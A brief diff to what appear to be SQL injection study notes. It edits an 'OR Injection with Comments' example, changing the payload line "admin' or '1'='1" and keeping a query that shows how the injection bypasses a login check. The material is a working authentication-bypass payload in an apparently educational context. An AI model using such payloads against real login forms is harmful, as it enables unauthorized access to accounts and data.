@@ -20,7 +20,7 @@
 ### OR Injection with Comments
 
 ```sql
-admin' or '1'='1 -- -
+admin' or '1'='1
 SELECT * FROM logins WHERE username='admin' or '1'='1' -- -AND password = 'something';
 ```
 
